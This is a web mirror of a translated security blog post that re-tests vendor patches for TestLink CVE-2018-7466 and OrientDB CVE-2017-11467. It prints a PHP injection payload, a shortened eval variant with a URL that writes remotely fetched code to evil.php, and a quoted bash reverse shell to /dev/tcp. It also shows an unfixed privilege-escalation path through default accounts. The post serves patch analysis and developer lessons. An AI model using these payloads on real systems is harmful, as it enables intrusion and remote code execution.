<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Is it possible to enter the closed door, or how patches vulnerabilities</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dozens of CVEs are published every day in the world (according to company riskbasedsecurity.com, 20,832 CVEs were published in 2017). However, manufac...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Is it possible to enter the closed door, or how patches vulnerabilities</h1><div class="post__text post__text-html js-mediator-article">  Dozens of <a href="http://riskbasedsecurity.com/">CVEs</a> are published every day in the world (according to company <a href="http://riskbasedsecurity.com/">riskbasedsecurity.com, 20,832 CVEs</a> were published in 2017).  However, manufacturers have become more attentive and attentive to security reports, thanks to which the speed of closing bugs has increased significantly (according to our feelings). <br><br>  It became interesting to us to look at several products and to understand what caused the vulnerabilities (we learn from the mistakes of others).  And also how manufacturers fix them and whether they always get it (looking ahead - not always). <br><br><img src="https://habrastorage.org/webt/gg/9d/8j/gg9d8jf7r31sowigmkcxl6x4wdo.jpeg"><br><a name="habracut"></a><br><h3>  Selection criteria: </h3><br>  As in any <s>well-</s> controlled experiment, we have put a number of restrictions on the vulnerabilities considered: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <ul><li>  there must be an exploit - we want to see that before the upgrade everything was <s>well exploited</s> badly, and then it became good; </li><li>  Vulnerability should be critical (ideally RCE) and with a high score; </li><li>  product must be open source; </li><li>  the product must not be abandoned and actively used; </li><li>  vulnerability must be relatively new; </li><li>  the main thing is that we ourselves should be interested. </li></ul><br><h3>  What and how we chose: </h3><br>  We went to <a href="http://vulners.com/">vulners.com</a> (‚ÄúGoogle‚Äù for Hackers) and asked to show all exploits from <a href="http://exploit-db.com/">exploit-db.com</a> over the past couple of weeks.  So we found our first subject <s>under</s> test.  Product TestLink Open Source Test Management is a web-based test management system written in PHP. <br>  (CVE-2018-7466, score 8.3, RCE, published February 25, 2018 - everything we wanted). <br>  We decided to search for the second test subject with score 10. And here we came across a vulnerability in OrientDB (CVE-2017-11467, score 10, RCE, published July 17, 2017, almost as we wanted).  OrientDB is an open DBMS that combines the capabilities of a document-oriented and graph-oriented database <a href="https//ru.wikipedia.org/wiki/OrientDB">(wiki)</a> . <br><br>  The selection process took us 15-20 minutes.  For most of this time, we tried to understand what kind of product it is and whether it fits our criteria.  It turns out, the choice can be called relatively random.  We proceed to the consideration of our subjects. <br><br><h3>  TestLink Open Source Test Management (CVE-2018-7466): </h3><br>  We read the description of the <a href="https//vulners.com/exploitdb/EDB-ID:44226">exploit</a> .  We see that the version before 1.9.16 (inclusive) is vulnerable and that everything is fixed in version 1.9.17.  Go to the manufacturer's website in the hope of downloading a new and old version.  Here we are waited by the first surprising moment: on the manufacturer‚Äôs website there is only a vulnerable version.  Searches on the Internet version 1.9.17 do not give results.  We find the news that the new version will be in the first quarter of 2018.  But there is a <a href="https//github.com/TestLinkOpenSourceTRMS/testlink-code">github project</a> where you can get the latest version to understand how the developers fixed the problem. <br><br>  We put TestLink, everything is simple.  You need to install a bunch of Apache + PHP + Mysql and unzip the project folder to the Web server folder.  After that, go to your Web-server, where we will be met by the installation wizard, which will inform us that the default user is admin with the password admin.  When you first log in, we are not asked to change it, but this can be easily done in the user settings. <br><br>  From the text of the exploit, we understand that the problem script is ‚Äú/install/installDbInput.php‚Äù.  It is located in the install folder, and we have already completed the installation, and it, in theory, should already be unavailable.  However, if you try to contact her, it turns out that this is not the case.  This behavior of the installer is very insecure, since anyone can rub all your records.  Here I, of course, bend over a stick.  In fact, it can indicate that you need to use the new Mysql server, but in the old everything will remain, and you can roll back to the working version. <br><br>  In the text of the exploit, a string of the form is transmitted as the user name: <br><br><pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">"box');file_put_contents($_GET[1],file_get_contents($_GET[2]));//"</span></span></code> </pre> <br>  Obviously, we have an injection in the php-code.  Let's see where it comes from.  Go to the installDbInput.php script and see in the lines 62 through 69 save the user values.  After, they are somehow used, and then in lines 489-498 are saved to a file. <br><br><pre> <code class="php hljs">$cfg_file = <span class="hljs-string"><span class="hljs-string">"../config_db.inc.php"</span></span>.</code> </pre> <br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// get db info from session //  62-69 $db_server = $_SESSION['databasehost']; $db_admin_name = $_SESSION['databaseloginname']; $db_admin_pass = $_SESSION['databaseloginpassword']; $db_name = $_SESSION['databasename']; $db_type = $_SESSION['databasetype']; $tl_db_login = $_SESSION['tl_loginname']; $tl_db_passwd = $_SESSION['tl_loginpassword']; $db_table_prefix = $_SESSION['tableprefix'];</span></span></code> </pre> <br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// 489-498 $data['db_host']=$db_server; $data['db_login'] = $user_host[0]; $data['db_passwd'] = $tl_db_passwd; $data['db_name'] = $db_name; $data['db_type'] = $db_type; $data['db_table_prefix'] = $db_table_prefix; $cfg_file = "../config_db.inc.php"; $yy = write_config_db($cfg_file,$data);</span></span></code> </pre><br>  As it is not difficult to guess, the php-code, which we recorded in the file ‚Äúconfig_db.inc.php‚Äù, is now easily accessible and can be executed (classic RCE into action). <br><br>  Here is the code for config_db.inc.php after the exploit: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// config_db.inc.php define('DB_TYPE', 'mysql'); define('DB_USER', 'box');file_put_contents($_GET[1],file_get_contents($_GET[2]));//'); define('DB_PASS', '123'); define('DB_HOST', 'localhost'); define('DB_NAME', 'testlink'); define('DB_TABLE_PREFIX', '');</span></span></code> </pre> <br><h3>  Fix from TestLink: </h3><br>  In the CVE description on <a href="http://nist.gov/">nist.gov</a> there is a link to a <a href="https//github.com/TestLinkOpenSourceTRMS/testlink-code/commit/9696012eecbafb0aa21cc346234512c29b4746">github</a> commit that ‚Äúcloses‚Äù this vulnerability, reducing the possible login length to 32 characters (why only a login, although injection is possible in all fields, and why up to 32 remains a mystery to us) .  We rubbed the little hands and decided to bypass the limit of 32 characters in the login (although it was possible to read the code more carefully and understand that we are already beating through the closed door). <br><br>  In the original exploit there were 64 characters in the injection.  Thinking how to reduce it, we decided to use the standard eval function and reduce the username to one letter.  Here's what we got: <br><br><pre> <code class="php hljs"><span class="hljs-string"><span class="hljs-string">b');eval($_GET['</span></span>e<span class="hljs-string"><span class="hljs-string">']);//</span></span></code> </pre> <br>  23 characters (if you can be shorter, then write in the comments, we are curious), use something like this: <br><br><pre> <code class="php hljs">/config_db.inc.php?e=file_put_contents($_GET[<span class="hljs-string"><span class="hljs-string">'filename'</span></span>],file_get_contents($_GET[<span class="hljs-string"><span class="hljs-string">'filedata'</span></span>]));&amp;filename=evil.php&amp;filedata=http:<span class="hljs-comment"><span class="hljs-comment">//.../src.txt</span></span></code> </pre> <br>  Having checked on the old version that our ‚Äúexploit‚Äù code is working, we downloaded the new version from the git (there is still no official version), set it and were disappointed because our code did not work. <br><br><h3>  Why didn't our code work? </h3><br>  In the config_db.inc.php file, our code was entered in the form: <br><br><pre> <code class="php hljs">define(<span class="hljs-string"><span class="hljs-string">'DB_USER'</span></span>, <span class="hljs-string"><span class="hljs-string">'bevalGETe'</span></span>);</code> </pre> <br>  That is, removed all the special characters.  We look into the installNewDB.php code more closely and see that in lines 56-82 a ‚Äúprocessing‚Äù of user input has been added: <br><br><pre> <code class="php hljs">$san = <span class="hljs-string"><span class="hljs-string">'/[^A-Za-z0-9\-]/'</span></span>; $db_name = trim($_SESSION[<span class="hljs-string"><span class="hljs-string">'databasename'</span></span>]); $db_name = preg_replace($san,<span class="hljs-string"><span class="hljs-string">''</span></span>,$db_name);</code> </pre> <br>  That is, all characters other than letters, numbers, and the ‚Äú-‚Äù character are deleted.  And, accordingly, the exploit stops working.  ATTENTION.  Not only the exploit stops working, but the functionality itself.  Since the preg_replace with the regular expression '/ [^ A-Za-z0-9 \ -] /' applies to all fields, it is no longer possible to define a remote host with a database.  Since it is difficult to imagine a record in which there will not be a dot (both in the domain record and in the record of the ipv4 address) or a colon (no one has canceled the ipv6 address).  It is also now easier to sort through passwords (they can contain only letters, numbers, and the ‚Äú-‚Äù symbol). <br><br><h3>  Conclusions on TestLink and CVE-2018-7466: </h3><br><ul><li>  vulnerability closed; </li><li>  regular expression closing vulnerability breaks part of the functionality; </li><li>  regular expression that closes the vulnerability, simplifies the search for passwords; </li><li>  <a href="http://nist.gov/">nist.gov</a> is the wrong commit that closes the vulnerability ( <a href="https//github.com/TestLinkOpenSourceTRMS/testlink-code/commit/6927ed1b7dafe84ae7c57982d66fe42f08d048c5">this is the correct one</a> ). </li></ul><br><h3>  Hosted by a note on TestLink and CVE-2018-7466: </h3><br><ul><li>  filter user input (using special language functions for this, not samopisnye regular expressions); </li><li>  do not store user input in php scripts (and prohibit the launch of the php interpreter for files with a different extension, and at the same time, the return of these files); </li><li>  do not store logins and passwords from the database in open form; </li><li>  deny access or delete the install directory after installation. </li></ul><br><h3>  OrientDB (CVE-2017-11467): </h3><br>  We read the description of the <a href="https//vulners.com/exploitdb/EDB-ID:44068">exploit</a> .  There again there is a link to <a href="https//github.com/orientechnologies/orientdb/wiki/OrientDB-2.2-Release-Notes">github</a> , where it is said that the vulnerability is fixed in version 2.2.23.  So, for a start, we are interested in version 2.2.22 (which should be vulnerable). <br><br>  Installation at this time is much easier.  Developers give docker containers where everything is set up, and docker hub stores all versions.  Therefore, we simply write: <br><br><pre> <code class="python hljs">sudo docker run -d --name orientdb -p <span class="hljs-number"><span class="hljs-number">2424</span></span>:<span class="hljs-number"><span class="hljs-number">2424</span></span> -p <span class="hljs-number"><span class="hljs-number">2480</span></span>:<span class="hljs-number"><span class="hljs-number">2480</span></span> -e ORIENTDB_ROOT_PASSWORD=root orientdb:<span class="hljs-number"><span class="hljs-number">2.2</span></span><span class="hljs-number"><span class="hljs-number">.22</span></span></code> </pre> <br>  and get a container with a vulnerable version of OrientDB.  We copy the Python code of the exploit to ourselves and run it.  However, the script drops with the words that we do not have a database (it is possible that it will still fall with the words that you are missing some Python package).  We go to our local host on port 2480 and create a database.  We start the exploit again, this time it will not work either, since the built-in payload (reverse shell) requires a bash, and in our container there is only sh. <br><br>  For the test, we decided to write payload, which simply creates a file.  It is clear that in real life everything can be done much more interesting. <br><br>  For the payload is the variable query, which contains the code in the Groovy language.  Change payload with <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">command</span></span></span><span class="hljs-function"> = \'</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">bash</span></span></span><span class="hljs-function"> -</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function"> &gt;&amp; /</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dev</span></span></span><span class="hljs-function">/</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcp</span></span></span><span class="hljs-function">/'+</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">reverse_ip</span></span></span><span class="hljs-function">+'/8081 0&gt;&amp;1\';</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">File</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">new</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">File</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(\\</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"hello.sh\\"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">delete</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> &lt;&lt; </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(\\</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"#!/bin/bash\\\\n\\"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> &lt;&lt; </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(command)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">proc</span></span></span><span class="hljs-function"> = \\"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">bash</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">hello</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sh</span></span></span><span class="hljs-function">\\".</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">execute</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">;</span></span></code> </pre> <br>  on <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">command</span></span></span><span class="hljs-function"> = \'</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">touch</span></span></span><span class="hljs-function"> /</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">orientdb</span></span></span><span class="hljs-function">/</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">test</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sh</span></span></span><span class="hljs-function"> \';</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">File</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">new</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">File</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(\\</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"hello.sh\\"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">delete</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> &lt;&lt; </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(\\</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"#!/bin/sh\\\\n\\"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">file</span></span></span><span class="hljs-function"> &lt;&lt; </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(command)</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">proc</span></span></span><span class="hljs-function"> = \\"/</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">bin</span></span></span><span class="hljs-function">/</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sh</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">hello</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sh</span></span></span><span class="hljs-function">\\".</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">execute</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">;</span></span></code> </pre> <br>  We start the exploit, and a test.sh file is created inside our container.  Great, the exploit is working, the vulnerability is present. <br><br><h3>  We check that everything is closed. </h3><br>  Now we check that everyone successfully closed in version 2.2.23 (version dated July 11, 2017).  We start the container with this version (we create the base), we launch the exploit and in the container we check the file.  We do not believe our eyes: our test file is there.  We check the product version (there is an ‚Äúabout‚Äù tab in the web interface) - everything is correct there, version 2.2.23.  We restart the exploit with a different file name (test.sh is not the original name) - everything worked.  We check the description of the exploit on <a href="https//nvd.nist.gov/vuln/detail/CVE-2017-11467">nist.gov</a> .  There is a link that the vulnerability is closed in version 2.2.23. <br><br>  Okay, let's look for the version where the vulnerability was closed.  Very lucky that there are containers of all versions and a binary search algorithm.  Stocking cookies and begin the search.  We are launching the latest version - 2.2.33 (March 5, 2018) - without the hope that something will work on it.  Check - works. <br><br>  We look at the exploit code and see that the problem is a little less serious than initially thought: all requests are executed on behalf of the user ‚Äúwriter‚Äù with the password ‚Äúwriter‚Äù.  In other words, the second holy rule is violated: built-in accounts are created with wired passwords.  Even the giants suffer from this (recall the high-profile vulnerability of Oracle <a href="https//nvd.nist.gov/vuln/detail/CVE-2017-10151">last year</a> , where the gap was assigned to the embedded user OIMINTERNAL), which is to be expected from a small opensource product.  Later it turned out that there is not only this account, but also admin: admin (my favorites) and reader / reader.  At the same time, there is no place for everyone via the web-interface for 2 minutes, where they can be changed, and in the official documentation there is no information that this should be done. <br><br>  The problem is that when creating a database, these users are automatically added to it.  Even if it were not possible to execute the code, viewing the data (and their modification) can be a problem for the owner of the resource using OrientDB and its users. <br><br><h3>  Why not closed? </h3><br>  We look at the <a href="https//github.com/orientechnologies/orientdb/commit/200535c3183f7db88ee4526bf3316d6bdeddb68e">commit</a> in which we had to close this vulnerability.  OCommandExecutorSQLSelect.java file has been added to check that the user has read permission in the ‚Äúdatabase.systemclusters‚Äù role, which should solve the problem of changing permissions.  Raising the container version 2.2.23 again, logging in as user writer and going to the Security tab, we see an access error message: <br><br><pre> <code class="python hljs">com.orientechnologies.orient.core.exception.OSecurityAccessException: User <span class="hljs-string"><span class="hljs-string">'writer'</span></span> does <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> have permission to execute the operation <span class="hljs-string"><span class="hljs-string">'Read'</span></span> against the resource: ResourceGeneric [name=SYSTEM_CLUSTER, legacyName=database.systemclusters].null DB name=<span class="hljs-string"><span class="hljs-string">"test23"</span></span></code> </pre> <br>  This means that the user can not view their rights.  In version 2.2.22 there was no such error and the user could easily watch and change his rights. <br><br>  Pay attention to the file name: OcommandExecutorSQLSelect.java.  In it is the keyword Select.  We look <a href="https//github.com/orientechnologies/orientdb/tree/200535c3183f7db88ee4526bf3316d6bdeddb68e/core/src/main/java/com/orientechnologies/orient/core/sql">in the folder on the gita</a> and see that for each SQL command, there is a class, and the last change just belongs to the class OCommandExecutorSQLSelect.java (9 months ago). <br><br>  The exploit code has the priv_escalation function <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">priv_escalation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(target,port=</span></span><span class="hljs-string"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"2480"</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Checking OrientDB Database version is greater than 2.2"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> check_version(target,port): databases = enum_databases(target) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> databases priv1 = run_queries(<span class="hljs-string"><span class="hljs-string">"GRANT"</span></span>,<span class="hljs-string"><span class="hljs-string">"database.class.ouser"</span></span>,<span class="hljs-string"><span class="hljs-string">"Privilege Escalation done checking enabling operations on database.function"</span></span>) priv2 = run_queries(<span class="hljs-string"><span class="hljs-string">"GRANT"</span></span>,<span class="hljs-string"><span class="hljs-string">"database.function"</span></span>,<span class="hljs-string"><span class="hljs-string">"Enabled functional operations on database.function"</span></span>) priv3 = run_queries(<span class="hljs-string"><span class="hljs-string">"GRANT"</span></span>,<span class="hljs-string"><span class="hljs-string">"database.systemclusters"</span></span>,<span class="hljs-string"><span class="hljs-string">"Enabling access to system clusters"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> priv1 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> priv2 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> priv3: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span>,</code> </pre> <br>  which performs the operations "Grant" to the roles database.class.ouser, database.function, database.systemclusters (they are given full rights to "create", "read", "update", "execute", "delete"). <br><br>  The <a href="http://">OCommandExecutorSQLGrant.java</a> class does not take into account the changes that occurred in the OcommandExecutorSQLSelect.java class, and that calls can be made directly to the API (and not poked in the Web interface).  It turns out that it is possible to give yourself the rights necessary to run Groovy code, which can be executed in the context of the operating system, which is what happens in the exploit. <br><br>  There is a violation of the third holy rule: closing the vulnerability in the displayed results, and not in the API, to which the user also has access. <br><br><h3>  Conclusions on OrientDB and CVE-2017-11467: </h3><br><ul><li>  The vulnerability is not closed (when accessing the API, you can give yourself the necessary rights to run Groovy code); </li><li>  the system has built-in users with high rights; </li><li>  Shodan says that 458 hosts around the world use OrientDB, which means that they can potentially be accessed.  (Intuition tells me that the administrators of these databases did not think about the built-in users and did not ban them.) </li></ul><br><br><h3>  Hosted by a note on OrientDB and CVE-2017-11467: </h3><br><ul><li>  <s>do not create embedded users with the same passwords;</s> </li><li>  <s>during installation, change passwords to the built-in users (if you need them so much);</s> </li><li>  do not create embedded users; </li><li>  correct errors in the API, and not in the displayed results; </li><li>  closed vulnerabilities may not be closed; </li><li>  nist.gov again wrong. </li></ul><br><h3>  Conclusion: </h3><br>  The topic of closing vulnerabilities was much more interesting than we initially thought.  Randomly selected two vulnerabilities demonstrated that they close strangely and poorly.  In the future, we will continue to look at what is happening with the closure of vulnerabilities.  Write in the commentary what strange ‚Äúclosed‚Äù vulnerabilities you have observed. </div><p>Source: <a href="https://habr.com/ru/post/353108/">https://habr.com/ru/post/353108/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../353092/index.html">Digital events in Moscow from April 9 to 15</a></li>
<li><a href="../353094/index.html">ECO Flow in Vivado or working in netlist editing mode</a></li>
<li><a href="../353100/index.html">Explicit Proxy with authorization by AD Group + Interception Proxy with authorization by MAC</a></li>
<li><a href="../353102/index.html">Effective use of AWS spot instances</a></li>
<li><a href="../353104/index.html">Procedural maze generation in Unity</a></li>
<li><a href="../353110/index.html">Mitap Cocoaheads in Tutu.ru office</a></li>
<li><a href="../353112/index.html">Security violations of mobile applications as a result of insufficient attention of the developers</a></li>
<li><a href="../353114/index.html">Kubernetes 1.10: a review of major innovations</a></li>
<li><a href="../353116/index.html">Dagaz: Looking for talents</a></li>
<li><a href="../353118/index.html">Sberbank Business Online on Windows 10 - a new solution for customers, or why UWP applications are driving</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>